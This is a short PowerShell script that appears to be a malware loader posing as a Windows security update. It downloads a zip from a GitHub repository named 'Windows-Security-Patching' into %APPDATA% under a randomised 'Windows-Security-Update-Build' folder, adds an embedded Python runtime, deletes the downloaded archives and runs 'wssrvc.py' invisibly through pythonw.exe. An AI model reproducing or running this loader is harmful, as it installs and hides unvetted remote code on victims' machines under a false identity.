$MAJOR = Get-Random -Minimum 1 -Maximum 11
$MINOR = Get-Random -Minimum 0 -Maximum 100
$BUILD = Get-Random -Minimum 0 -Maximum 1000
$REVISION = Get-Random -Minimum 0 -Maximum 10000
$VERSION = "$MAJOR.$MINOR.$BUILD.$REVISION"
$BuildVersion = "Windows-Security-Update-Build-$VERSION"
$FolderName = "$BuildVersion"
$AppDataPath = $env:APPDATA
wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurity.zip -O $AppDataPath\WindowsSecurity.zip
Expand-Archive -Path $AppDataPath\WindowsSecurity.zip -DestinationPath $AppDataPath\$FolderName
wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $AppDataPath\python-3.14.0-embed-amd64.zip
Expand-Archive -Path $AppDataPath\python-3.14.0-embed-amd64.zip -DestinationPath $AppDataPath\$FolderName\WindowsSecurity\
rm $AppDataPath\WindowsSecurity.zip
rm $AppDataPath\python-3.14.0-embed-amd64.zip
& "$AppDataPath\\$FolderName\\WindowsSecurity\\pythonw.exe" @("$AppDataPath\$FolderName\WindowsSecurity\wssrvc.py")
